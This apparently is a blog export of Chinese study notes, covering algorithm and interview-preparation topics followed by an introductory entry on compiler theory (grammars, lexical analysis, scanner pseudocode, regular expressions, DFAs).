<p>左右指针：一般初始化为 left &#x3D; 0, right &#x3D; nums.length - 1 。<br>二分查找；<br>两数之和；<br>反转数组；<br>滑动窗口。</p>
<h1 id="排序"><a href="#排序" class="headerlink" title="排序"></a>排序</h1><p>排序应该考虑数据的特点：</p>
<ul>
<li>一般情况下：快排</li>
<li>包含大量重复元素：三路快排</li>
<li>近乎有序：插入排序</li>
<li>有限范围：计数排序</li>
<li>稳定排序：归并排序</li>
<li>内存不足：外排序</li>
<li>无法随机存取：归并排序</li>
</ul>
<h1 id="面试准备"><a href="#面试准备" class="headerlink" title="面试准备"></a>面试准备</h1><p>准备的主要内容：</p>
<ul>
<li>梳理项目<ul>
<li>项目经历</li>
<li>遇到的实际问题</li>
</ul>
</li>
<li>遇到过的难以解决的BUG</li>
<li>面向对象与设计模式</li>
<li>网络、安全、内存、并发等问题</li>
<li>系统规模，系统设计，承载量</li>
</ul>
<p>个人经历，结合项目：</p>
<ul>
<li>遇到的最大的挑战</li>
<li>犯过的错误</li>
<li>经历的失败</li>
<li>最享受的工作内容</li>
<li>遇到冲突的解决方法</li>
<li>做过的与众不同的事</li>
</ul>
<p>做好问面试官的问题：</p>
<ul>
<li>小组的运行模式</li>
<li>项目的后续规划</li>
<li>产品中的某个问题如何解决的</li>
<li>为什么选择这个技术和标准</li>
<li>我在这个小组中有机会深入学习某个技术吗</li>
</ul>
<p>低概率算法面试题：</p>
<ul>
<li>红黑树</li>
<li>B-Tree</li>
<li>斐波那契堆</li>
<li>计算几何</li>
<li>数论</li>
<li>FFT</li>
</ul>
<p>常见算法面试题：</p>
<ul>
<li>排序算法</li>
<li>数据结构的实现：堆，二叉树，图</li>
<li>数据结构的使用：链表，栈，队列，哈希表，图，Trie，并查集</li>
<li>算法：深度优先，广度优先，二分查找，递归</li>
<li>基本思想：递归，分治，回溯，贪心，动态规划</li>
</ul>
<p>推荐</p>
<ul>
<li>LeetCode</li>
<li>HackerRank</li>
</ul>
<p>关键词：</p>
<ul>
<li>是否有序</li>
<li>时间复杂度</li>
<li>空间复杂度</li>
<li>数据规模</li>
</ul>
<p>找思路和优化：</p>
<ul>
<li>设计几个简单的测试用例</li>
<li>考虑暴力解法，再优化</li>
<li>使用常见的算法和数据结构</li>
<li>空间换时间</li>
<li>排序</li>
</ul>
<p>一定要会白板编程：</p>
<ul>
<li>堆</li>
<li>快排</li>
<li>…</li>
</ul>
<h1 id="算法复杂度"><a href="#算法复杂度" class="headerlink" title="算法复杂度"></a>算法复杂度</h1><p>一秒内各个复杂度能力：</p>
<ul>
<li>n^2 - 10^4</li>
<li>n - 10^8 </li>
<li>nlogn - 10^7</li>
</ul>
<h1 id="对数器"><a href="#对数器" class="headerlink" title="对数器"></a>对数器</h1><p>使用最不容易出错的方法实现一个程序，再用这个程序测试自己的算法。</p>
<h1 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h1><h2 id="BFPRT"><a href="#BFPRT" class="headerlink" title="BFPRT"></a>BFPRT</h2><h2 id="KMP"><a href="#KMP" class="headerlink" title="KMP"></a>KMP</h2><h2 id="位运算"><a href="#位运算" class="headerlink" title="位运算"></a>位运算</h2><p>异或：满足交换律。</p>
<p>找到一个数组中一个出现奇数次的数：偶数个数异或为零。</p>
<p>取int最右侧的1：N &amp; ((~N) + 1)，</p>
<p>有两个数（a，b）出现奇数次，其他都是偶数次：所有数异或，相对于 a 异或 b 且结果不为 0，取结果int最右侧的 1。例如是第x位，那么a和b的第x位一定不同。此时可以按照第八位不同来将数组划分成两半。各自找出组内唯一的奇数次数。</p>
<p>大小写转化</p>
<ul>
<li>转小写 <code>(&#39;a&#39; | &#39; &#39;) = &#39;a&#39;, (&#39;A&#39; | &#39; &#39;) = &#39;a&#39;</code></li>
<li>转大写 <code>(&#39;a&#39; &amp; &#39;_&#39;) = &#39;A&#39;, (&#39;A&#39; &amp; &#39;_&#39;) = &#39;A&#39;</code></li>
<li>大小写呼唤 <code>(&#39;a&#39; ^ &#39;_&#39;) = &#39;A&#39;, (&#39;A&#39; ^ &#39;_&#39;) = &#39;a&#39;</code></li>
</ul>
<h2 id="并查集"><a href="#并查集" class="headerlink" title="并查集"></a>并查集</h2><h1 id="链表"><a href="#链表" class="headerlink" title="链表"></a>链表</h1><p>快慢指针：</p>
<ul>
<li>找中点（上中点，下中点），中点上一个点：先处理头节点，不足3个节点的情况。</li>
</ul>
<p>判断链表回文：</p>
<ul>
<li>栈：所有元素入栈，然后取出一个元素，与链表元素比对，直到完成所有比对。</li>
<li>修改链表后半个方向</li>
</ul>
<p>划分为元素左边小，中间等，右边大：考虑换头。</p>
<ul>
<li>利用数组</li>
<li>划分为3个区，每个区存储2个边界，再把链表放入3个区中，最后串联所有区。</li>
</ul>
<p>复制链表：链表上每个节点还有额外指针指向其他元素</p>
<ul>
<li>使用哈希表，旧节点与新节点一一映射。</li>
</ul>
<p>判断链表是否相交，可能存在环</p>
<ul>
<li>判断环，得到环的第一个节点。<ul>
<li>使用 Set，存储内存地址。</li>
<li>快慢指针，相遇后，快指针从头开始，每次一步，直到再相遇。</li>
</ul>
</li>
<li>如果都无环，一定是 Y 结构</li>
<li>使用 Set</li>
<li>记录两个链表长度，先判断他们最后节点是同一个节点，如果是，则一定相交。长链表先走，走到长度一致的位置开始，然后两链表一起走，一定会同时走到相交节点。</li>
<li>如果有环，一个无环，则一定不相交</li>
<li>两个都有环：不相交，相交且有相同的入环节点，相交且入环节点不同。</li>
<li>相交且有相同的入环节点：与 Y 结构解法类似</li>
<li>相交且入环节点不同、不相交：判断一个环上是否同时存在两个入环节点。</li>
</ul>
<p>约瑟夫环问题</p>
<ul>
<li>循环链表</li>
</ul>
<h1 id="二叉树"><a href="#二叉树" class="headerlink" title="二叉树"></a>二叉树</h1><p>非递归遍历：</p>
<ul>
<li>先序遍历：弹出就打印，先压入右，再压入左。</li>
<li>中序遍历：先压缩左边界所有节点，之后弹出一个节点打印，来到它的右树，再压入其所有左边界。</li>
<li>后序遍历：不严格方式，先序遍历的逆序，用栈收集元素。严格方式，要借用辅助指针。h指针表示上一个处理的节点，c指针表示当前处理的节点，然后判断c的左右两个还是是否右h，根据情况判断处理子树还是处理栈中元素。</li>
<li>按层遍历：使用队列。查看一行是否遍历结束，使用标志变量。</li>
</ul>
<p>序列化、反序列化：遇到空节点也要输出。</p>
<ul>
<li>先序遍历</li>
<li>层序遍历</li>
</ul>
<p>打印一颗二叉树：</p>
<ul>
<li>补成满二叉树打印</li>
<li>设计树的输出顺序：右-头-左，然后按行输出</li>
</ul>
<p>中序找后继节点</p>
<ul>
<li>右树上最左结点，或祖先是左子树的结点</li>
</ul>
<p>判断平衡树</p>
<ul>
<li>使用二叉树：考虑左右子树需要为自己提供的信息</li>
</ul>
<p>返回整棵树的最大距离</p>
<ul>
<li>左树的最大距离 + 右树的最大距离，或左(右)树自己的最大距离</li>
</ul>
<p>找出二叉树中的最大搜索二叉树</p>
<ul>
<li>左(右)树自己的最大搜索二叉树，或包含自己的最大搜索二叉树<ul>
<li>获取子树的：最大值，最小值，是否是搜索二叉树，包含的搜索二叉树大小</li>
</ul>
</li>
</ul>
<p>判断满二叉树：</p>
<ul>
<li>2^L - 1 &lt;&#x3D; H</li>
</ul>
<p>判断完全二叉树：</p>
<ul>
<li>宽度优先遍历，有右子树但无左子树则不是，都有则继续，只有左或没有子树，则后续都必须是叶子结点。</li>
</ul>
<p>找两个结点的公共祖先</p>
<ul>
<li>利用 Set ，并用 Map 记录子父关系</li>
<li>自己是目标结点，目标结点在左子树，或右子树，或不存在。</li>
</ul>
<p>贪心算法：证明有效的方法是举反例</p>
<ul>
<li>排序：不一定有传递性，贪心算法的排序需要传递性</li>
</ul>
<p>线段树：区间中增删改查，算法复杂度是 log N</p>
<ul>
<li>数组先补成 2^N 长度，再以此构建一个满二叉树</li>
<li>每个结点设计标记：lazy，change，update 标记</li>
</ul>
<h1 id="图算法"><a href="#图算法" class="headerlink" title="图算法"></a>图算法</h1><p>遍历</p>
<ul>
<li>宽度优先遍历<ul>
<li>考虑环的问题：标记法，数组 或 Set</li>
</ul>
</li>
<li>深度优先遍历</li>
</ul>
<p>拓扑排序</p>
<ul>
<li>队列：每次入度为零的点加入</li>
<li>数组：排序结果</li>
</ul>
<p>最小生成树</p>
<ul>
<li>堆：存放边</li>
</ul>
<p>最短路径</p>
<ul>
<li>Dijkstra</li>
</ul>
<h1 id="动态规划-1"><a href="#动态规划-1" class="headerlink" title="动态规划"></a>动态规划</h1><p>一共<code>4</code>种模型。</p>
<p>打印字符串的子序列</p>
<ul>
<li>暴力递归，参数包括：字符串，当前的字符序号，之前所形成的答案（叶节点用），当前使用的路径。叶结点处理路径结果。</li>
<li>去重后只求个数，动态规划</li>
</ul>
<p>打印字符串的全排列</p>
<ul>
<li>暴力递归：<code>str[i]</code>之后的所有字符都有机会到<code>str[i]</code>位置，之前的都是定好的。</li>
</ul>
<p>从左往右尝试模型：</p>
<ul>
<li><code>111</code>可以转化为<code>AAA</code>或<code>KA</code></li>
<li>0-1背包：不变量，货物的重量，价值，包裹的大小；变量，选择了哪些货物，已经存放了多少重量（或剩余的空间）；因变量，总价值</li>
</ul>
<p>范围上尝试模型</p>
<ul>
<li>数值不同的纸牌排成一条线，玩家A和玩家B依次拿走纸牌，且每次只能拿最左或最右的纸牌。如果A先拿，则获胜者的分数是多少。需要参数：数组，范围的左右边界。<ul>
<li>base case - 如果范围内只有一个纸牌，则直接返回这个纸牌</li>
<li>要么选左边的牌，要么选右面的牌，选完后变后手。</li>
<li>站在先手的角度考虑，求先手的函数要max，求后手的函数要min</li>
</ul>
</li>
</ul>
<p>多样本位置全对应的尝试模型</p>
<p>寻找业务限制的尝试模型</p>
<p>经典问题</p>
<ul>
<li>N 皇后问题<ul>
<li>优化：位运算，斜线限制使用位移</li>
</ul>
</li>
</ul>
<p>动态规划的解法：先暴力写法，再改记忆化搜索算法，再改经典动态规划（可不改）。如果状态出现枚举行为，则改经典动态规划后会继续优化（利用状态转移做优化）。看一个格子依赖谁，每次依赖多少，就可以压缩到多少。</p>
<ul>
<li>记忆化搜索：键要包括变量，值要设定初始值。</li>
</ul>
<p>特殊问题：</p>
<ul>
<li>取石子问题，合并石子问题，四边形不等式。</li>
<li>摆放广告牌问题。</li>
<li>斜率优化</li>
<li>初始值设置</li>
</ul>
<h1 id="预处理"><a href="#预处理" class="headerlink" title="预处理"></a>预处理</h1><ul>
<li>前缀和</li>
<li>前缀树</li>
<li>排序</li>
</ul>
<h1 id="其他问题"><a href="#其他问题" class="headerlink" title="其他问题"></a>其他问题</h1><p>海盗分金币问题：分析设定，从小依次递推</p>
<p>欧拉信封问题：找递推公式 F(n) &#x3D; (n-1) * (f(n-2) + f(n-1)), 初值 0, 1, 2</p>
<h1 id="NP-完全问题"><a href="#NP-完全问题" class="headerlink" title="NP 完全问题"></a>NP 完全问题</h1>]]></content>
      <categories>
        <category>计算机理论</category>
      </categories>
      <tags>
        <tag>Algorithm</tag>
      </tags>
  </entry>
  <entry>
    <title>编译原理</title>
    <url>/2020/02/16/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%90%86%E8%AE%BA/Compile/</url>
    <content><![CDATA[<p>…</p>
<span id="more"></span>

<h1 id="编译原理序章"><a href="#编译原理序章" class="headerlink" title="编译原理序章"></a>编译原理序章</h1><h2 id="翻译程序"><a href="#翻译程序" class="headerlink" title="翻译程序"></a>翻译程序</h2><p>$\sum_{i&#x3D;0}^N\int_{a}^{b}g(t,i)\text{d}t$</p>
<p>编译程序是一种翻译程序，它是高级语言翻译为低级语言的过程，这个低级语言可以在计算机上运行。</p>
<p>编译程序有：</p>
<ul>
<li>诊断编译程序</li>
<li>优化编译程序</li>
<li>交叉编译程序</li>
<li>可变目标编译程序</li>
</ul>
<h2 id="解释程序"><a href="#解释程序" class="headerlink" title="解释程序"></a>解释程序</h2><p>把源语言写的源程序作为输入，但不产生目标程序，而是边编译边执行。</p>
<h2 id="计算思维"><a href="#计算思维" class="headerlink" title="计算思维"></a>计算思维</h2><p>计算思维就是计算机科学的思维方法：</p>
<ul>
<li>抽象：提取一般过程；</li>
<li>自动化：将思维物化的过程；</li>
<li>问题分解：做全局性决策，再分解为小问题；</li>
<li>递归：通过解决子问题来解决大问题；</li>
<li>权衡：权衡理论与实际；</li>
<li>保护、冗余、容错、纠错、恢复</li>
<li>启发式推理</li>
<li>不确定情况下的规划、学习、调度</li>
</ul>
<p>编译的五个过程：</p>
<ul>
<li>词法分析：输入源程序，识别单词符号，遵循构词规则，利用有限自动机。</li>
<li>语法分析：根据单词符号串分解为语法单位，遵循语法规则，利用上下文无关文法。</li>
<li>中间代码产生：根据语法单位进行初步翻译，依据语义规则，利用属性文法。产生三元式，四元式，树。</li>
<li>优化：对中间代码优化，依据等价变换规则。</li>
<li>目标代码产生：变为目标代码，依据硬件系统结构和机器指令。有三种代码：汇编指令代码，绝对指令代码，可重定位指令代码（需要连接）。</li>
</ul>
<p>编译程序的框架：</p>
<ul>
<li>词法分析器</li>
<li>语法分析器</li>
<li>语义分析与中间代码生成器</li>
<li>优化段</li>
<li>目标代码生成器</li>
<li>符号表管理</li>
<li>出错处理：语法错误，语义错误。</li>
</ul>
<p>相关概念：</p>
<ul>
<li>遍（pass）：从头到尾扫描一次。一遍可以由若干段组成。</li>
<li>前端与后端：前端是由源语言到中间语言，机器无关；后端是中间语言到目标代码，机器相关。</li>
<li>高级语言编写：由一种高级语言编译另一种高级语言；</li>
<li>移植：把一个机器上的编译程序移植到另一个机器上；</li>
<li>自编译：由自身编译自身。</li>
</ul>
<p>编译编译工具的工具：LEX，YACC等。</p>
<h1 id="高级语言"><a href="#高级语言" class="headerlink" title="高级语言"></a>高级语言</h1><h2 id="语法和语义和语用"><a href="#语法和语义和语用" class="headerlink" title="语法和语义和语用"></a>语法和语义和语用</h2><p>语法：一组规则，用它可以形成和产生合适的程序。</p>
<p>词法规则：单词符号的形成规则。最基本结构。一般包括常数，标识符，基本字，算符，界符等。描述工具是有限自动机。</p>
<p>语法规则：语法单位的形成规则。一般包括表达式，语句，分程序，过程，函数，程序等。描述工具是上下文无关文法。</p>
<p>例如，E为表达式，i为标识符。下面表示一组构成表达式的语法规则：<br>E -&gt; i<br>E -&gt; E + E<br>E -&gt; E * E<br>E -&gt; (E)</p>
<p>语义：一组规则，可以定义一个程序的意义。</p>
<ul>
<li>描述方法有：<ul>
<li>自然语言描述：具有二义性，隐藏错误，不完整性；</li>
<li>形式描述：操作语义，指称语义，代数语义。</li>
</ul>
</li>
</ul>
<p>程序的层次：程序-&gt;子程序或函数-&gt;语句-&gt;表达式-&gt;运算符</p>
<p>高级语言分类：</p>
<ul>
<li>强制式语言&#x2F;过程式语言：一个语句接着一个语句强到对数据的操作。</li>
<li>应用式语言：强调描述函数的构造来实现对数据的处理。</li>
<li>基于规则的语言：检查一定条件，如果满足条件则执行动作。</li>
<li>面向对象语言：通过类，对象，消息与消息响应等处理数据。</li>
</ul>
<p>程序结构：</p>
<ul>
<li>FORTRAN：由主程序段和辅程序段构成。各段可独立编译。但是无法嵌套和递归。</li>
<li>PASCAL：可以看做是一个过程，允许嵌套和递归。<ul>
<li>作用域</li>
<li>最近嵌套原则</li>
</ul>
</li>
<li>JAVA：面向对象。</li>
</ul>
<p>高级语言一般特性：</p>
<ul>
<li>数据结构：<ul>
<li>属性：区别于其他的对象的属性。</li>
<li>值：允许的取值。</li>
<li>操作：可以进行的操作。</li>
</ul>
</li>
<li>数据类型与操作：<ul>
<li>数值：<ul>
<li>整形，实数，复数，双精度</li>
<li>加减乘除等</li>
</ul>
</li>
<li>逻辑类型：<ul>
<li>布尔型</li>
<li>布尔运算</li>
</ul>
</li>
<li>字符类型：<ul>
<li>符号处理</li>
</ul>
</li>
<li>指针类型</li>
</ul>
</li>
</ul>
<p>标识符：一种语法概念，由字母，数字组成。<br>名字：语义概念，标识程序中的对象。</p>
<p>标识符可以绑定到名字。</p>
<p>名字的意义和属性：</p>
<ul>
<li>值：单元中的内容。</li>
<li>属性：类型和作用域。</li>
</ul>
<p>名字的说明方式：</p>
<ul>
<li>由说明语句来明确规定：如，int score</li>
<li>隐含说明：以某字母开头代表整形，否则为实数型</li>
<li>动态确定</li>
</ul>
<p>数据结构：</p>
<ul>
<li>数组：由同一类型的数据组成，分为可变与不可变长度。要给出访问方式，存放方式。<ul>
<li>内情向量：登记维数，记录上下限等。</li>
</ul>
</li>
<li>记录：元素构成，可各不相乘。各元素也称为域。要给出访问和存储方式。</li>
<li>字符串：符号处理，公式处理。</li>
<li>表格：记录结构</li>
<li>栈。</li>
<li>线性表。</li>
<li>抽象数据类型：由数据集合和相关操作组成，但操作不给出具体实现。</li>
</ul>
<p>语句与控制结构：</p>
<ul>
<li>表达式：操作数和算符组成<ul>
<li>形式：前缀，后缀，中缀。</li>
<li>构成规则。</li>
<li>优先次序：左结合，右结合，代数性质（数学）。</li>
</ul>
</li>
<li>语句：<ul>
<li>赋值语句：<ul>
<li>名字的左值：该名字代表的地址。</li>
<li>名字的右值：该名字代表的值。</li>
</ul>
</li>
<li>控制语句：<ul>
<li>无条件转义。</li>
<li>条件语句。</li>
<li>循环语句。</li>
<li>过程调用语句。</li>
<li>返回语句。</li>
</ul>
</li>
<li>分类：<ul>
<li>功能<ul>
<li>执行性：执行。</li>
<li>说明性：声明。</li>
</ul>
</li>
<li>形式<ul>
<li>简单句</li>
<li>复合句</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h1 id="文法"><a href="#文法" class="headerlink" title="文法"></a>文法</h1><h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><p>文法：描述语法结构的形式规则。</p>
<p>字母表：是一个有穷字符集，记为<code>Σ</code>。</p>
<p>字符：字母表中的元素。</p>
<p><code>Σ</code>上的字（字符串）：指由<code>Σ</code>中的字符构成的有穷序列。</p>
<p>空字：字符串中不包含任何字符的序列，记为<code>ε</code>。</p>
<p><code>Σ*</code>：所有字的全体，包含空字。</p>
<p><code>Σ*</code>的子集U，V的连接（积）定义为：</p>
<center>U V = {αβ | α∈U & β∈V}</center>
也就是两个集合的所有字符串进行拼接得到的结果。

<p>二者UV和VU运算结果不同，因为顺序不一样。</p>
<p>$V^n$：V的n次方。特别的，$V^0$ &#x3D; { <code>ε</code> }。</p>
<p>V<em>：是V的闭包，V</em> &#x3D; $V^0$ ∪ $V^1$ ∪ $V^2$ ∪ …</p>
<p>V+：V的正规闭包，V+ &#x3D; V V*，正规闭包不会引入空字，其他一样。</p>
<p>-&gt;：定义，左边是被定义的对象，右边是定义内容。</p>
<h2 id="上下文无关文法"><a href="#上下文无关文法" class="headerlink" title="上下文无关文法"></a>上下文无关文法</h2><p>设G是一个四元组：</p>
<center>G = (VT, VN, S, P)</center>
其中：
- VT：终结符集合，非空，是不能分解的单位
- VN：非终结符集合，非空，且 VT ∩ VN = ∅，是可以再分解的
- 不允许一个符号即是终结符，又是非终结符
- S：文法的开始符号，S∈VN
- P：产生式的集合，每个产生式形式为：
<center> P       ->      α ，P ∈ VN，α∈(VT∪VN)* </center>


<p>例如定义：<code>G = &lt; &#123;i, +, *, (, )&#125;, &#123;E&#125;, E, P&gt;</code>，P由下列产生式组成：</p>
<ul>
<li>E -&gt; i</li>
<li>E -&gt; E + E</li>
<li>E -&gt; E * E</li>
<li>E -&gt; (E)</li>
</ul>
<p>巴科斯范式(BNF)：</p>
<ul>
<li>定义符使用<code>::=</code></li>
<li>表示文法：给出开始符号和产生式</li>
<li>文法化简：G(E): E -&gt; i|E+E|E*E|(E)</li>
</ul>
<p>推导<br>      *     </p>
<ul>
<li>α1 $\Longrightarrow$  αn：经过0步或若干步推出<br>+</li>
<li>α1 $\Longrightarrow$  αn：经过1步或若干步推出</li>
</ul>
<p>句型：S 星推出 阿尔法 是句型。</p>
<p>句子：仅含有终结符的句型是句子。</p>
<p>语言：文法G产生的句子的全体是语言。</p>
<p>L(G) &#x3D; { α | S +推出 阿尔法, α∈VT*}</p>
<p>例1：证明(i*i+i)是文法。由E开始推导。<br>例2：给出{a^n b^n | n&gt;&#x3D;1}的文法。</p>
<p>最左推导：替换最左边的终结符。<br>最右推导：替换最右边的终结符。<br>语法树：推导树。<br>二义性：</p>
<ul>
<li>推导树不一样：二义文法；</li>
<li>可以由两个文法产生：二义语言。</li>
</ul>
<p>无二义文法：<br>E -&gt; T | E + T<br>T -&gt; F | T * F<br>F -&gt; (E) | i</p>
<p>形式语言（仅有产生式不一样，终结符，非终结符，文法开始符号都一样）：</p>
<ul>
<li>0型文法：短语文法，图灵机。产生式：α -&gt; β，α β ∈ (VT ∪ VN)*且至少包含一个非终结符。</li>
<li>1型文法：上下文有关文法，线性界限自动机。产生式：α -&gt; β，α长度&lt;&#x3D;β长度，仅S-&gt;ε除外。</li>
<li>2型文法：上下文无关文法，非确定下推自动机。产生式：A -&gt; β，A∈VN，β∈(VT ∪ VN)*，利用栈分析。</li>
<li>3型文法：正规文法，有限自动机。产生式：A -&gt; αB或A -&gt; α，α∈VT*，A B∈VN</li>
</ul>
<h1 id="词法分析"><a href="#词法分析" class="headerlink" title="词法分析"></a>词法分析</h1><h2 id="词法分析器"><a href="#词法分析器" class="headerlink" title="词法分析器"></a>词法分析器</h2><p>词法分析器</p>
<ul>
<li>功能：输入源程序，输出单词符号</li>
<li>单词符号种类：<ul>
<li>基本字，关键字</li>
<li>标识符：变量名，函数名等</li>
<li>常数</li>
<li>运算符</li>
<li>界符</li>
</ul>
</li>
<li>输出<ul>
<li>二元组（单词种别，单词自身的值）</li>
<li>种别：整数编码</li>
<li>值：标准二进制</li>
</ul>
</li>
</ul>
<p>词法分析器组成：</p>
<ul>
<li>预处理：去除空白，跳格，回车、注释；区分符号区，句末符</li>
<li>输入缓冲区：接收文件</li>
<li>扫描器：驱动程序，输出单词符号</li>
<li>扫描缓冲区：接收预处理输出文本</li>
</ul>
<p>扫描器：</p>
<ul>
<li>起点指示器</li>
<li>搜索指示器</li>
<li>扫描缓冲区：分为两个半区，半区长度为单词最大长度。</li>
<li>超前搜索：使用限制减轻超前搜索任务<ul>
<li>基本字</li>
<li>标识符</li>
<li>字符串</li>
<li>常数</li>
<li>其他</li>
</ul>
</li>
</ul>
<h2 id="状态转换图"><a href="#状态转换图" class="headerlink" title="状态转换图"></a>状态转换图</h2><p>状态转换图：</p>
<ul>
<li>结点：状态</li>
<li>状态之间用箭头表示，上面标记可能出现的输入字符和字符类</li>
<li>一张图只包含有限个状态，一个初态，至少一个终态。</li>
<li>可以用于识别和接收一定的字符串。</li>
<li>终态有两个圈套起来构成，加*表示退掉最后一个字符。</li>
<li>只有终态表示返回。</li>
</ul>
<p>状态状态实现：</p>
<ul>
<li>定义：<ul>
<li>ch：字符变量，存放最近一个读入字符</li>
<li>strToken：字符数组</li>
<li>GetChar：读入下一个字符ch</li>
<li>GetBC：跳过空白符</li>
<li>Concat：把ch连入strToken</li>
<li>IsLetter，IsDisgital：判断是否为字母，数字</li>
<li>Reserve：检查是否是保留字，并给出编码</li>
<li>Retract：搜索指针退回一个位置</li>
<li>InsertId：将标识符插入符号表，给出符号表指针</li>
<li>InsertConst：将strToken插入常数表，返回常数表指针</li>
</ul>
</li>
<li>实现：</li>
</ul>
<img src="/2020/02/16/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%90%86%E8%AE%BA/Compile/state_pic.png" class="" title="状态转换图">

<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> code, value;</span><br><span class="line"><span class="type">char</span> strToken[MAX_VALUE];</span><br><span class="line"></span><br><span class="line"><span class="built_in">GetChar</span>();</span><br><span class="line"><span class="built_in">GetBC</span>();</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">IsLetter</span>())&#123;  <span class="comment">// 分支 1</span></span><br><span class="line">  <span class="keyword">while</span>(<span class="built_in">IsLetter</span>() <span class="keyword">or</span> <span class="built_in">IsDigit</span>())&#123;</span><br><span class="line">    <span class="built_in">Concat</span>();</span><br><span class="line">    <span class="built_in">GetChar</span>();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">Retract</span>();</span><br><span class="line">  code = <span class="built_in">Reserve</span>();</span><br><span class="line">  <span class="keyword">if</span>(code == <span class="number">0</span>)&#123;</span><br><span class="line">    value = <span class="built_in">InsertId</span>(strToken);</span><br><span class="line">    <span class="keyword">return</span> ($ID, value);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="built_in">return</span> (code, <span class="literal">NULL</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">IsDigit</span>())&#123;  <span class="comment">// 分支 2</span></span><br><span class="line">  <span class="keyword">while</span>(<span class="built_in">IsDigit</span>())&#123;</span><br><span class="line">    <span class="built_in">Concat</span>();</span><br><span class="line">    <span class="built_in">GetChar</span>();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">Retract</span>();</span><br><span class="line">  value = <span class="built_in">InsertConst</span>(strToken);</span><br><span class="line">  <span class="keyword">return</span> ($INT, value);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(ch == <span class="string">&#x27;=&#x27;</span>)&#123;   <span class="comment">// 分支 3 </span></span><br><span class="line">  <span class="built_in">return</span> ($ASSIGN, <span class="literal">NULL</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(ch == <span class="string">&#x27;+&#x27;</span>)&#123;</span><br><span class="line">  <span class="built_in">return</span> ($PLUS, <span class="literal">NULL</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(ch == <span class="string">&#x27;*&#x27;</span>)&#123;</span><br><span class="line">  <span class="built_in">GetChar</span>();</span><br><span class="line">  <span class="keyword">if</span>(ch == <span class="string">&#x27;*&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> ($POWER, <span class="literal">NULL</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">Retract</span>();</span><br><span class="line">  <span class="keyword">return</span> ($STAR, <span class="literal">NULL</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(ch == <span class="string">&#x27;,&#x27;</span>)&#123;</span><br><span class="line">  <span class="built_in">return</span> ($COMMA, <span class="literal">NULL</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(ch == <span class="string">&#x27;(&#x27;</span>)&#123;</span><br><span class="line">  <span class="built_in">return</span> ($LPAR, <span class="literal">NULL</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(ch == <span class="string">&#x27;)&#x27;</span>)&#123;</span><br><span class="line">  <span class="built_in">return</span> ($RPAR, <span class="literal">NULL</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="built_in">ProcError</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>状态图的代码化：</p>
<ul>
<li><code>curState</code>：现有状态</li>
<li><code>stateTrans[state][ch]</code>：状态图，state当前状态，ch输入符号，返回下一个状态</li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">curState = <span class="string">&quot;初态&quot;</span></span><br><span class="line"><span class="built_in">GetChar</span>();</span><br><span class="line"><span class="keyword">while</span>(stateTrans[curState][ch] is defined)&#123;</span><br><span class="line">  <span class="built_in">Concat</span>();</span><br><span class="line">  curState = stateTrans[curState][ch];</span><br><span class="line">  <span class="keyword">if</span> (curState is FINAL_STATE)&#123;</span><br><span class="line">    <span class="keyword">return</span> strToken;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">GetChar</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="自动机"><a href="#自动机" class="headerlink" title="自动机"></a>自动机</h1><h2 id="正规集，正规式"><a href="#正规集，正规式" class="headerlink" title="正规集，正规式"></a>正规集，正规式</h2><p>正规集：合法的单词和符号。</p>
<p>正规式：是表示正规集的方法。</p>
<p>正规式</p>
<ul>
<li>ε和∅都是Σ上的正规式，表示的正规集为{ε}和∅</li>
<li>对于任意a∈Σ，a是Σ上的正规式，它表示的正规集为{a}</li>
<li>如果e1和e2都是Σ上的正规式，他们的正规集是L(e1)和L(e2)，则<ul>
<li>(e1|e2)为正规式，表示的正规集为L(e1)∪L(e2)，并集</li>
<li>(e1·e2)为正规式，表示的正规集为L(e1)L(e2)，连接</li>
<li><code>(e1)*</code>为正规式，表示的正规集为<code>( L(e1) )*</code>，闭包</li>
</ul>
</li>
</ul>
<p>等价：如果两个正规式表示的正规集相同，则两个正规式等价。</p>
<p>例：证明：<code>(a*b*)=(a|b)*</code></p>
<p>对于正规式满足：</p>
<ul>
<li>或运算交换律</li>
<li>或运算结合律</li>
<li>或运算分配律</li>
<li>连接运算没有交换律</li>
</ul>
<h2 id="确定有限自动机-DFA"><a href="#确定有限自动机-DFA" class="headerlink" title="确定有限自动机 DFA"></a>确定有限自动机 DFA</h2><p>确定有限自动机 M &#x3D; (S, Σ, f, S0, F)</p>
<ul>
<li>S：有穷状态集</li>
<li>Σ：输入字母表（有穷）</li>
<li>f：状态转换函数  S x Σ -&gt; S，例如f(s, a)&#x3D;s’，表示当前状态s，输入字符a，转换为后继状态s’</li>
<li>S0：S0∈S，表示唯一的初态</li>
<li>F：F包含于S，表示终态的集合，可以为空，表示没有终态</li>
</ul>
<p>设，M &#x3D; ( {0, 1, 2, 3}, {a, b}, f, 0, {3} )</p>
